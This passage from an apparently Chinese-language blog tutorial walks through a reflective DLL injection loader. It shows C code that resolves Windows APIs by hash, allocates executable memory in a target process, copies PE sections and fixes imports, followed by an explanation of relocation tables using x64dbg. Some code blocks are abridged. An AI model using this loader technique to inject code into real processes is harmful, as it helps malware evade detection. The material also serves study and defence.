				<span class=k>else</span> <span class=nf>if</span> <span class=p>(</span><span class=n>dwHashValue</span> <span class=o>==</span> <span class=n>GETPROCADDRESS_HASH</span><span class=p>)</span>
					<span class=n>pGetProcAddress</span> <span class=o>=</span> <span class=p>(</span><span class=n>GETPROCADDRESS</span><span class=p>)(</span><span class=n>uiBaseAddress</span> <span class=o>+</span> <span class=n>DEREF_32</span><span class=p>(</span><span class=n>uiAddressArray</span><span class=p>));</span>
				<span class=k>else</span> <span class=nf>if</span> <span class=p>(</span><span class=n>dwHashValue</span> <span class=o>==</span> <span class=n>VIRTUALALLOC_HASH</span><span class=p>)</span>
					<span class=n>pVirtualAlloc</span> <span class=o>=</span> <span class=p>(</span><span class=n>VIRTUALALLOC</span><span class=p>)(</span><span class=n>uiBaseAddress</span> <span class=o>+</span> <span class=n>DEREF_32</span><span class=p>(</span><span class=n>uiAddressArray</span><span class=p>));</span>
				<span class=c1>// 找到需要的函数就将数量减一
</span><span class=c1></span>				<span class=n>usCounter</span><span class=o>--</span><span class=p>;</span>
			<span class=p>}</span>
			<span class=c1>// 如果不是目标函数，就取出下一个函数名称数组元素
</span><span class=c1></span>			<span class=n>uiNameArray</span> <span class=o>+=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>DWORD</span><span class=p>);</span>
			<span class=c1>// ordinals同步增长以便用作取出函数地址的索引
</span><span class=c1></span>			<span class=n>uiNameOrdinals</span> <span class=o>+=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>WORD</span><span class=p>);</span>
		<span class=p>}</span>
	<span class=p>}</span>
	<span class=c1>// 如果DLL的Hash值与ntdll.dll的相同
</span><span class=c1></span>	<span class=c1>// 下面的操作与kernel32.dll的相同就不再赘述
</span><span class=c1></span>	<span class=k>else</span> <span class=k>if</span> <span class=p>((</span><span class=n>DWORD</span><span class=p>)</span><span class=n>uiValueC</span> <span class=o>==</span> <span class=n>NTDLLDLL_HASH</span><span class=p>)</span>
	<span class=p>{</span>
		<span class=c1>//该DLL中寻找NtFlushInstructionCache函数，过程与前面一模一样就不再赘述	
</span><span class=c1></span>	<span class=p>}</span>
		<span class=c1>// 当找到所有需要的函数就停止
</span><span class=c1></span>		<span class=k>if</span> <span class=p>(</span><span class=n>pLoadLibraryA</span> <span class=o>&amp;&amp;</span> <span class=n>pGetProcAddress</span> <span class=o>&amp;&amp;</span> <span class=n>pVirtualAlloc</span> <span class=o>&amp;&amp;</span> <span class=n>pNtFlushInstructionCache</span><span class=p>)</span>
			<span class=k>break</span><span class=p>;</span>
		<span class=c1>// 双向链表，Flink为下一个DLL信息结构体节点的地址，而DEREF为*(UINT_PTR*)取Flink指针指向的地址的值，也就是下一个节点的地址
</span><span class=c1></span>		<span class=n>uiValueA</span> <span class=o>=</span> <span class=n>DEREF</span><span class=p>(</span><span class=n>uiValueA</span><span class=p>);</span>
	<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>上面的整个过程就是遍历所有DLL找到Kernel32.dll和Ntdll.dll两个DLL，然后再遍历这两个DLL的导出函数找到目标函数。</p>
<p>步骤3: 为DLL的Image结构在目标进程中申请足够的内存空间，并将PE头先行复制该空间。因为PE头不需要进行大小变动。</p>
<p>核心代码：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=c1>// 在前面定位目标DLL基地址时uiLibraryAddress被减到了DLL文件的基址
</span><span class=c1>// uiHeaderValue 为要加载DLL的NT头地址
</span><span class=c1></span><span class=n>uiHeaderValue</span> <span class=o>=</span> <span class=n>uiLibraryAddress</span> <span class=o>+</span> <span class=p>((</span><span class=n>PIMAGE_DOS_HEADER</span><span class=p>)</span><span class=n>uiLibraryAddress</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>e_lfanew</span><span class=p>;</span>
<span class=c1>//我们可以在任何地址申请足够的DLL内存来加载DLL文件，因为我们将对Image重定位。将所有内存置零并设置可读写执行的权限避免可能的问题
</span><span class=c1>//通过获取DLL文件的SizeOfImage来申请足够的内存
</span><span class=c1></span><span class=n>uiBaseAddress</span> <span class=o>=</span> <span class=p>(</span><span class=n>ULONG_PTR</span><span class=p>)</span><span class=n>pVirtualAlloc</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span> <span class=p>((</span><span class=n>PIMAGE_NT_HEADERS</span><span class=p>)</span><span class=n>uiHeaderValue</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>OptionalHeader</span><span class=p>.</span><span class=n>SizeOfImage</span><span class=p>,</span> <span class=n>MEM_RESERVE</span> <span class=o>|</span> <span class=n>MEM_COMMIT</span><span class=p>,</span> <span class=n>PAGE_EXECUTE_READWRITE</span><span class=p>);</span>
<span class=c1>//获取PE头大小
</span><span class=c1></span><span class=n>uiValueA</span> <span class=o>=</span> <span class=p>((</span><span class=n>PIMAGE_NT_HEADERS</span><span class=p>)</span><span class=n>uiHeaderValue</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>OptionalHeader</span><span class=p>.</span><span class=n>SizeOfHeaders</span><span class=p>;</span>
<span class=c1>//此时为DLL文件基址
</span><span class=c1></span><span class=n>uiValueB</span> <span class=o>=</span> <span class=n>uiLibraryAddress</span><span class=p>;</span> 
<span class=c1>//为DLL文件Image申请的内存的基址
</span><span class=c1></span><span class=n>uiValueC</span> <span class=o>=</span> <span class=n>uiBaseAddress</span><span class=p>;</span> 
<span class=c1>// 从为Image申请的内存基址开始复制DLL的PE文件头
</span><span class=c1></span><span class=k>while</span> <span class=p>(</span><span class=n>uiValueA</span><span class=o>--</span><span class=p>)</span>
	<span class=o>*</span><span class=p>(</span><span class=n>BYTE</span><span class=o>*</span><span class=p>)</span><span class=n>uiValueC</span><span class=o>++</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>BYTE</span><span class=o>*</span><span class=p>)</span><span class=n>uiValueB</span><span class=o>++</span><span class=p>;</span>
</code></pre></td></tr></table>
</div>
</div><p>步骤4: 将所有节区加载到为Image申请的内存空间中</p>
<p>核心代码:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// 获取第一个节区头的起始地址
</span><span class=c1></span><span class=n>uiValueA</span> <span class=o>=</span> <span class=p>((</span><span class=n>ULONG_PTR</span><span class=p>)</span> <span class=o>&amp;</span> <span class=p>((</span><span class=n>PIMAGE_NT_HEADERS</span><span class=p>)</span><span class=n>uiHeaderValue</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>OptionalHeader</span> <span class=o>+</span> <span class=p>((</span><span class=n>PIMAGE_NT_HEADERS</span><span class=p>)</span><span class=n>uiHeaderValue</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>FileHeader</span><span class=p>.</span><span class=n>SizeOfOptionalHeader</span><span class=p>);</span>
<span class=c1>// 获取节区数量
</span><span class=c1></span><span class=n>uiValueE</span> <span class=o>=</span> <span class=p>((</span><span class=n>PIMAGE_NT_HEADERS</span><span class=p>)</span><span class=n>uiHeaderValue</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>FileHeader</span><span class=p>.</span><span class=n>NumberOfSections</span><span class=p>;</span>
<span class=k>while</span> <span class=p>(</span><span class=n>uiValueE</span><span class=o>--</span><span class=p>)</span>
<span class=p>{</span>
	<span class=c1>// 定位到为DLL文件申请的内存空间中的该节区的地址
</span><span class=c1></span>	<span class=n>uiValueB</span> <span class=o>=</span> <span class=p>(</span><span class=n>uiBaseAddress</span> <span class=o>+</span> <span class=p>((</span><span class=n>PIMAGE_SECTION_HEADER</span><span class=p>)</span><span class=n>uiValueA</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>VirtualAddress</span><span class=p>);</span>
	<span class=c1>// 获取该节区的文件偏移
</span><span class=c1></span>	<span class=n>uiValueC</span> <span class=o>=</span> <span class=p>(</span><span class=n>uiLibraryAddress</span> <span class=o>+</span> <span class=p>((</span><span class=n>PIMAGE_SECTION_HEADER</span><span class=p>)</span><span class=n>uiValueA</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>PointerToRawData</span><span class=p>);</span>
	<span class=c1>// 获取节区保存在文件时的大小
</span><span class=c1></span>	<span class=n>uiValueD</span> <span class=o>=</span> <span class=p>((</span><span class=n>PIMAGE_SECTION_HEADER</span><span class=p>)</span><span class=n>uiValueA</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>SizeOfRawData</span><span class=p>;</span>
	<span class=c1>// 将节区数据复制到为DLL文件申请的内存中该节区的内存
</span><span class=c1></span>	<span class=k>while</span> <span class=p>(</span><span class=n>uiValueD</span><span class=o>--</span><span class=p>)</span>
		<span class=o>*</span><span class=p>(</span><span class=n>BYTE</span><span class=o>*</span><span class=p>)</span><span class=n>uiValueB</span><span class=o>++</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>BYTE</span><span class=o>*</span><span class=p>)</span><span class=n>uiValueC</span><span class=o>++</span><span class=p>;</span>
	<span class=c1>// 获取下一个节区头的起始地址
</span><span class=c1></span>	<span class=n>uiValueA</span> <span class=o>+=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>IMAGE_SECTION_HEADER</span><span class=p>);</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>步骤5: 修复IAT，让IAT数据为Image结构下的内容</p>
<p>核心代码:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>//获得保存导入表入口的地址
</span><span class=c1></span><span class=n>uiValueB</span> <span class=o>=</span> <span class=p>(</span><span class=n>ULONG_PTR</span><span class=p>)</span> <span class=o>&amp;</span> <span class=p>((</span><span class=n>PIMAGE_NT_HEADERS</span><span class=p>)</span><span class=n>uiHeaderValue</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>OptionalHeader</span><span class=p>.</span><span class=n>DataDirectory</span><span class=p>[</span><span class=n>IMAGE_DIRECTORY_ENTRY_IMPORT</span><span class=p>];</span>
<span class=c1>// 假设存在导入表
</span><span class=c1>// 获取导入表起始地址(IDT的地址)
</span><span class=c1></span><span class=n>uiValueC</span> <span class=o>=</span> <span class=p>(</span><span class=n>uiBaseAddress</span> <span class=o>+</span> <span class=p>((</span><span class=n>PIMAGE_DATA_DIRECTORY</span><span class=p>)</span><span class=n>uiValueB</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>VirtualAddress</span><span class=p>);</span>
	<span class=c1>// 遍历所有导入函数，如果函数没有名称则通过Ordinal导入
</span><span class=c1></span>	<span class=k>while</span> <span class=p>(</span><span class=n>DEREF</span><span class=p>(</span><span class=n>uiValueA</span><span class=p>))</span>
	<span class=p>{</span>
		<span class=c1>// 因为一些编译器仅通过IAT导入，因此要对uiValueD进行健壮性检查
</span><span class=c1></span>		<span class=c1>// uiValueD不为空
</span><span class=c1></span>		<span class=c1>// IMAGE_ORDINAL_FLAGE = 0x80000000 ,而用户内存空间为0x0 - 0x7FFFFFFF，
</span><span class=c1></span>		<span class=c1>//规定如果PIMAGE_THUNK_DATA成员为Ordinal时，最高位为1且低16位为Ordinal，如果为AddressOfData，最高位为0
</span><span class=c1></span>		<span class=c1>// 因此如果用Ordinal与0x80000000相与不为0说明是Ordinal，为0说明是AddressOfData
</span><span class=c1></span>		<span class=c1>// 即如果该函数是通过Ordinal导入而不是名称导入
</span><span class=c1></span>		<span class=k>if</span> <span class=p>(</span><span class=n>uiValueD</span> <span class=o>&amp;&amp;</span> <span class=p>((</span><span class=n>PIMAGE_THUNK_DATA</span><span class=p>)</span><span class=n>uiValueD</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>u1</span><span class=p>.</span><span class=n>Ordinal</span> <span class=o>&amp;</span> <span class=n>IMAGE_ORDINAL_FLAG</span><span class=p>)</span>
		<span class=p>{</span>
			<span class=c1>// 获取加载至内存的DLL文件的NT头地址
</span><span class=c1></span>			<span class=n>uiExportDir</span> <span class=o>=</span> <span class=n>uiLibraryAddress</span> <span class=o>+</span> <span class=p>((</span><span class=n>PIMAGE_DOS_HEADER</span><span class=p>)</span><span class=n>uiLibraryAddress</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>e_lfanew</span><span class=p>;</span>
			<span class=c1>// 获得DLL导出表地址
</span><span class=c1></span>			<span class=n>uiNameArray</span> <span class=o>=</span> <span class=p>(</span><span class=n>ULONG_PTR</span><span class=p>)</span> <span class=o>&amp;</span> <span class=p>((</span><span class=n>PIMAGE_NT_HEADERS</span><span class=p>)</span><span class=n>uiExportDir</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>OptionalHeader</span><span class=p>.</span><span class=n>DataDirectory</span><span class=p>[</span><span class=n>IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class=p>];</span>
			<span class=c1>// 获取DLL导出表的入口地址
</span><span class=c1></span>			<span class=n>uiExportDir</span> <span class=o>=</span> <span class=p>(</span><span class=n>uiLibraryAddress</span> <span class=o>+</span> <span class=p>((</span><span class=n>PIMAGE_DATA_DIRECTORY</span><span class=p>)</span><span class=n>uiNameArray</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>VirtualAddress</span><span class=p>);</span>
			<span class=c1>// 获取导出函数地址数组地址
</span><span class=c1></span>			<span class=n>uiAddressArray</span> <span class=o>=</span> <span class=p>(</span><span class=n>uiLibraryAddress</span> <span class=o>+</span> <span class=p>((</span><span class=n>PIMAGE_EXPORT_DIRECTORY</span><span class=p>)</span><span class=n>uiExportDir</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>AddressOfFunctions</span><span class=p>);</span>
			<span class=c1>// 通过Ordinal获取DLL导出函数地址,这里INT的Ordinal是在所有导入函数的序号，要变换到函数所在DLL的序号因此需要减Ordinal的Base
</span><span class=c1></span>			<span class=n>uiAddressArray</span> <span class=o>+=</span> <span class=p>((</span><span class=n>IMAGE_ORDINAL</span><span class=p>(((</span><span class=n>PIMAGE_THUNK_DATA</span><span class=p>)</span><span class=n>uiValueD</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>u1</span><span class=p>.</span><span class=n>Ordinal</span><span class=p>)</span> <span class=o>-</span> <span class=p>((</span><span class=n>PIMAGE_EXPORT_DIRECTORY</span><span class=p>)</span><span class=n>uiExportDir</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>Base</span><span class=p>)</span> <span class=o>*</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>DWORD</span><span class=p>));</span>
			<span class=c1>// 获取函数地址并写入IAT中
</span><span class=c1></span>			<span class=n>DEREF</span><span class=p>(</span><span class=n>uiValueA</span><span class=p>)</span> <span class=o>=</span> <span class=p>(</span><span class=n>uiLibraryAddress</span> <span class=o>+</span> <span class=n>DEREF_32</span><span class=p>(</span><span class=n>uiAddressArray</span><span class=p>));</span>
		<span class=p>}</span>
		<span class=c1>// 如果函数是通过名称导入
</span><span class=c1></span>		<span class=k>else</span>
		<span class=p>{</span>
			<span class=c1>// 获取IAT的数组的起始位置
</span><span class=c1></span>			<span class=n>uiValueB</span> <span class=o>=</span> <span class=p>(</span><span class=n>uiBaseAddress</span> <span class=o>+</span> <span class=n>DEREF</span><span class=p>(</span><span class=n>uiValueA</span><span class=p>));</span>
			<span class=c1>// 使用GetProcAddress函数从载入到uiLibraryAddress地址的DLL中获取该函数的地址，并写入IAT中
</span><span class=c1></span>			<span class=n>DEREF</span><span class=p>(</span><span class=n>uiValueA</span><span class=p>)</span> <span class=o>=</span> <span class=p>(</span><span class=n>ULONG_PTR</span><span class=p>)</span><span class=n>pGetProcAddress</span><span class=p>((</span><span class=n>HMODULE</span><span class=p>)</span><span class=n>uiLibraryAddress</span><span class=p>,</span> <span class=p>(</span><span class=n>LPCSTR</span><span class=p>)((</span><span class=n>PIMAGE_IMPORT_BY_NAME</span><span class=p>)</span><span class=n>uiValueB</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>Name</span><span class=p>);</span>
		<span class=p>}</span>
		<span class=c1>// IAT指针后移
</span><span class=c1></span>		<span class=n>uiValueA</span> <span class=o>+=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>ULONG_PTR</span><span class=p>);</span>
		<span class=c1>// INT指针后移
</span><span class=c1></span>		<span class=k>if</span> <span class=p>(</span><span class=n>uiValueD</span><span class=p>)</span>
			<span class=n>uiValueD</span> <span class=o>+=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>ULONG_PTR</span><span class=p>);</span>
		<span class=c1>// 因为在PE文件未被加载到内存前IAT和INT相同，当PE文件载入内存运行起来后INT和IAT不再一样,IAT保存导入函数地址，INT仍然是Ordinal或IIBN结构体
</span><span class=c1></span>		<span class=p>}</span>
	<span class=c1>// 指针指向下一个IID结构体，每导入一个DLL文件就会有一个IID结构体，因此也是指向下一个DLL
</span><span class=c1></span>	<span class=n>uiValueC</span> <span class=o>+=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>IMAGE_IMPORT_DESCRIPTOR</span><span class=p>);</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>步骤6: 处理Image的重定位，计算基址增量并执行重定位，即使加载到了期望的Image基址。</p>
<p>在此之前我们需要先了解重定位对象，重定位原因以及重定位表。</p>
<p>对于普通EXE进程来说都会有自己独立的虚拟内存空间，不需要考虑重定位问题。对于系统DLL文件来说系统会将其加载至其固定好了的ImageBase处也不需要考虑重定位问题，只有我们自己写的DLL文件才需要考虑。</p>
<p>因为我们自己写的DLL文件使用的是其他进程的内存空间，因此会发生目标DLL的ImageBase地址处已经被其他数据占据的情况，所以我们需要给DLL的数据找片空余的空间存放。</p>
<p>在DLL文件编译过程中，会由连接器给出一个DLL的优先加载地址ImageBase，又因为在DLL文件中由连接器生成的指令中的地址在是在假设模块被加载到ImageBase的前提下生成的。因此当DLL文件没有加载到ImageBase处，这些地址就会出现错误，因此我们需要进行重定位，将使用的地址同步DLL基地址的改变而修正，而重定位表的作用就是用来修正这些因DLL重定位导致出错的地址。</p>
<p>因此重定位块中的每一个重定位项(TypeOffset低12位)中保存的就是文件中所有需要进行重定位修正的机器码的相对该重定位块指向的内存页的相对虚拟地址(加上重定位表的VirtualAddress就是相对虚拟地址，将该虚拟地址换算成文件偏移，就能获得要修改的机器码数据)，(这里需要的修正的机器码，就是之前通过ImageBase计算好的二进制数据地址)</p>
<p>我在这里对IMAGE_BASE_RELOCATION组成的数组称为重定位表，一个IMAGE_BASE_RELOCATION称为重定位块，一个TypeOffset称为重定位项</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=ImageBaseRelocation.png data-srcset="/dllinjection/ImageBaseRelocation.png, ImageBaseRelocation.png 1.5x, /dllinjection/ImageBaseRelocation.png 2x" data-sizes=auto alt=/dllinjection/ImageBaseRelocation.png title=ImageBaseRelocation></p>
<p>由上图我们可以看到IMAGE_BASE_RELOCATION结构体成员，</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=k>typedef</span> <span class=k>struct</span> <span class=n>_IMAGE_BASE_RELOCATION</span> <span class=p>{</span>
<span class=n>DWORD</span> <span class=n>VirtualAddress</span><span class=p>;</span>  <span class=c1>//重定位内存页的起始RVA，本块中所有重定位项中的12位地址加上这个起始地址后就得到了真正的RVA值
</span><span class=c1></span><span class=n>DWORD</span> <span class=n>SizeOfBlock</span><span class=p>;</span>     <span class=c1>//重定位块的大小，从这个字段的值可以算出块中重定位项的数量
</span><span class=c1>//WORD TypeOffset[1]  //重定位项数组，数组每项由2个字节组成，高四位代表重定位类型，低12位位需要修改的机器码的地址
</span><span class=c1></span><span class=p>}</span> <span class=n>IMAGE_BASE_RELOCATION</span> 
</code></pre></td></tr></table>
</div>
</div><p>这里解释下，为什么TypeOffset低12位是需要修改的机器码的相对该重定位块指向的内存页的相对虚拟地址。</p>
<p>在我们调试的时候会发现，很多时候地址的高位都是不变的，一般都是地址的低位变化，高位地址还没开始变的时候程序就已经结束了，因此我们只需要一个VirtualAddress表示高位地址，然后TypeOffset低12位表示低位地址，这样就能最大程度节省空间。</p>
<p>那为什么是TypeOffset的低12位呢？当我们按照内存页来分割的时候，一个页中的寻址需要的指针位数为12位，2的12次方位4096，一页的大小也就4096字节，因此一个重定位块就指向一个内存页。VirtualAddress就是该重定位块指向的内存页的相对虚拟地址，而TypeOffset的第12位就是相对内存页的相对虚拟地址的相对地址。因此TypeOffset加上VirtualAddress就是需要修改的机器码所在的相对虚拟地址。</p>
<p>那为什么TypeOffset是两个字节，而不是只用12位呢？这和字节对齐有关，也就是按照两字节对齐，因此我们多定义一个4位数据为重定位类型。重定位类型我们只说常用的，在32位系统中，该值多为3，即IMAGE_REL_BASED_HIGHLOW类型，作用为重定位地址指向的双字的32位数据都需要被修正。在64位系统中，该值为A，作用为重定位地址指向的四字的64位数据都需要被修正。</p>
<p>综上我们可以获得一个重定位块的大小 sizeofblock = 4+4+2*n ，即(DWORD + DWORD + WORD * n)，这里的n为重定位项的个数。因此重定位项个数n = (sizeofblock - sizeof(IMAGE_BASE_RELOCATION))/2。因此当重定位项大于4个的时候，该方法就能节省空间。</p>
<p>当一个重定位项全为0的时候该重定位块就结束了。每个重定位块只负责重定位0x1000大小范围的数据，当要定位的范围超过时就会有多个重定位块存在。</p>
<p>这样说比较迷糊，我将通过项目中的TestDll.dll文件进行分析。</p>
<p>首先，我们需要定位到重定位表的地址，从DATA_DIRECTORY中获取，TestDll.dll的重定位表数据如下:</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=RelocationTable.png data-srcset="/dllinjection/RelocationTable.png, RelocationTable.png 1.5x, /dllinjection/RelocationTable.png 2x" data-sizes=auto alt=/dllinjection/RelocationTable.png title=RelocationTable></p>
<p>根据前面对重定位块的结构体定义，我们可以知道，VirtualAddress 为2000h，也就是该重定位块指向的内存页的相对虚拟地址为2000h，SizeOfBlock为28h = 40d，我们简要计算一下，(40 - 8)/2 = 16，从2808h开始到2827h结束，一共16个重定位项，包括最后全0的结尾重定位项。</p>
<p>我们以第一个重定位项为例，A0F0h，重定位类型为A，相对内存页相对虚拟地址的相对虚拟地址为0F0h，加上VirtualAddress 为20F0h，因此要修正的机器码的相对虚拟地址为20F0h，换算成文件偏移为14F0h，再查看数据如下:</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=14F0.png data-srcset="/dllinjection/14F0.png, 14F0.png 1.5x, /dllinjection/14F0.png 2x" data-sizes=auto alt=/dllinjection/14F0.png title=14F0></p>
<p>这就是需要重定位修正的机器码数据，我们再查看TestDll.dll的ImageBase，</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=ImageBase.png data-srcset="/dllinjection/ImageBase.png, ImageBase.png 1.5x, /dllinjection/ImageBase.png 2x" data-sizes=auto alt=/dllinjection/ImageBase.png title=ImageBase></p>
<p>因此可以得出结论，需要重定位的机器码数据是以ImageBase计算出来的地址。</p>
<p>我们通过x64dbg将TestDll.dll载入后进行查看其是否重定位以及重定位情况</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=%e6%98%af%e5%90%a6%e9%87%8d%e5%ae%9a%e4%bd%8d.png data-srcset="/dllinjection/%E6%98%AF%E5%90%A6%E9%87%8D%E5%AE%9A%E4%BD%8D.png, %e6%98%af%e5%90%a6%e9%87%8d%e5%ae%9a%e4%bd%8d.png 1.5x, /dllinjection/%E6%98%AF%E5%90%A6%E9%87%8D%E5%AE%9A%E4%BD%8D.png 2x" data-sizes=auto alt=/dllinjection/%E6%98%AF%E5%90%A6%E9%87%8D%E5%AE%9A%E4%BD%8D.png title=是否重定位></p>
<p>可以看到x64dbg给出的TestDll.dll重定位后的基址不为180000000h，我们将第一个重定位项中需要重定位修正的机器码的相对虚拟地址20F0h加上新的TestDll.dll基址7FFA05410000h，我们可以得到7FFA054120F0h地址，跳转此处查看，如下图所示:</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=7FFA054140F0.png data-srcset="/dllinjection/7FFA054140F0.png, 7FFA054140F0.png 1.5x, /dllinjection/7FFA054140F0.png 2x" data-sizes=auto alt=/dllinjection/7FFA054140F0.png title=7FFA054140F0></p>
<p>会发现，该地址的数据很怪，这是因为反汇编器造成的对齐问题，但是可以发现低4位的301B与我们dll未加载前的低4位相同，我们可以推测得到低4位数据就是相对于为加载前定义的基址的相对虚拟地址。</p>
<p>我们根据公式：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=n>Uncorrect_code_addr</span> <span class=o>-</span> <span class=n>old_ImageBase</span> <span class=o>=</span> <span class=n>code_RVA</span>
<span class=n>code_RVA</span> <span class=o>+</span> <span class=n>new_ImageBase</span> <span class=o>=</span> <span class=n>Correct_code_addr</span>
</code></pre></td></tr></table>
</div>
</div><p>计算该地址得到结果如下:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=mf>7FF</span><span class=n>A05410000</span> <span class=o>+</span> <span class=mi>180001</span><span class=n>B30</span> <span class=o>-</span> <span class=mi>180000000</span> <span class=o>=</span> <span class=mf>7FF</span><span class=n>A0541301B</span> 
</code></pre></td></tr></table>
</div>
</div><p>可以发现他和该地址处的机器码相同，我们将该区域机器码换成更方便观察的形式:</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=7FFA0541103B.png data-srcset="/dllinjection/7FFA0541103B.png, 7FFA0541103B.png 1.5x, /dllinjection/7FFA0541103B.png 2x" data-sizes=auto alt=/dllinjection/7FFA0541103B.png title=7FFA0541103B></p>
<p>可以很明显发现，TestDll.dll发生重定位后的结果与我们推到计算的结果相同。其余的需要重定位修正的机器码同理。</p>
<p>有了上面的储备知识，我们回到对反射式DLL注入的代码继续分析</p>
<p>核心代码:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span></code></pre></td>
